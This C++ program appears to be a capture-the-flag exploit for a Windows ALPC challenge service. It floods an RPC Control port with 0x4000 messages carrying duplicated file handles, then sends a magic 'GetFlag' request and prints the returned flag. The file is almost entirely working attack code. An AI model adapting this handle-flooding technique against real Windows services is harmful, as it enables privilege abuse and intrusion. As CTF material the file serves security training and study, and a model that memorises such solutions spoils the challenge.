#define _CRT_SECURE_NO_WARNINGS
#define STRSAFE_NO_CCH_FUNCTIONS

#include <cstdio>
#include <strsafe.h>
#include <memory>
#include "ALPC.h"

#pragma comment(lib, "alpc.lib")

#define PORT_FORMAT L"\\RPC Control\\%S"
#define PORT_MSG_SIZE 0x1000
#define LOWIL_DIR L"C:\\LowTemp"

int main(int argc, char* argv[]) {
  setvbuf(stdin, nullptr, _IONBF, 0);
  setvbuf(stdout, nullptr, _IONBF, 0);

  // Find low integrity temp location
  WCHAR path[MAX_PATH];
  if (!SUCCEEDED(StringCbPrintfW(path, sizeof(path), L"%s\\%s", LOWIL_DIR, L"mytoken.txt"))) {
    printf("Format string failed.\n");
    return 1;
  }

  // Create our file
  DWORD ret;
  HANDLE h = ::CreateFileW(path, FILE_ALL_ACCESS, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (h == INVALID_HANDLE_VALUE) {
    printf("Failed to create token file\n");
    return 1;
  }
  if (!WriteFile(h, "AAAA", 4, &ret, nullptr)) {
    printf("Failed to write file\n");
    return 1;
  }
  CloseHandle(h);

  // Connect to the port
  WCHAR portname[256] = { 0 };
  if (!SUCCEEDED(::StringCbPrintfW(portname, sizeof(portname), PORT_FORMAT, argv[1]))) {
    return 101;
  }

  auto client = ALPCClient::connect(portname, 2 * PORT_MSG_SIZE);
  if (!client) {
    printf("Failed to connect to port.\n");
    return 1;
  }

  auto msg = std::make_unique<ALPCMessage>(PORT_MSG_SIZE);
  msg->with_attribute(new ALPCMessageAttribute(ALPC_MESSAGE_ALL_ATTRIBUTE));
  auto recvmsg = std::make_unique<ALPCMessage>(PORT_MSG_SIZE);
  recvmsg->with_attribute(new ALPCMessageAttribute(ALPC_MESSAGE_ALL_ATTRIBUTE));

  // Flood with handles
  for (int i = 0; i < 0x4000; i++) {
    reinterpret_cast<uint32_t*>(msg->data())[0] = 8;
    reinterpret_cast<uint32_t*>(msg->data())[1] = 0x9999;

    HANDLE hFile = ::CreateFileW(path, FILE_READ_ACCESS, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
      PALPC_HANDLE_ATTR attr = msg->attrib()->get_pointer<ALPC_HANDLE_ATTR>(ALPC_MESSAGE_HANDLE_ATTRIBUTE);
      attr->Handle = hFile;
      attr->Flags = ALPC_HANDLEFLG_DUPLICATE_SAME_ACCESS;
      attr->DesiredAccess = 0;
      attr->ObjectType = 0;
      msg->attrib()->enable(ALPC_MESSAGE_HANDLE_ATTRIBUTE);
    }

    if (!client->sendrecv(*msg, *recvmsg)) {
      printf("Send message failed\n");
      return 1;
    }
    msg->clear();

    CloseHandle(hFile);
  }

  // Get flag
  reinterpret_cast<uint32_t*>(msg->data())[0] = 12;
  reinterpret_cast<uint32_t*>(msg->data())[1] = 0x1337;
  reinterpret_cast<uint32_t*>(msg->data())[2] = 0x41414141;

  if (!client->sendrecv(*msg, *recvmsg)) {
    printf("Failed to send GetFlag msg\n");
    return 1;
  }

  if (reinterpret_cast<uint32_t*>(recvmsg->data())[1] == 1) {
    printf("Flag: %s\n", reinterpret_cast<const char*>(reinterpret_cast<uint8_t*>(recvmsg->data()) + 8));
  } else {
    printf("Failed getting the flag.\n");
  }
  msg->clear();

  reinterpret_cast<uint32_t*>(msg->data())[0] = 8;
  reinterpret_cast<uint32_t*>(msg->data())[1] = 0;
  client->sendrecv(*msg, *recvmsg);
  delete client;
  printf("Done.\n");

  return 0;
}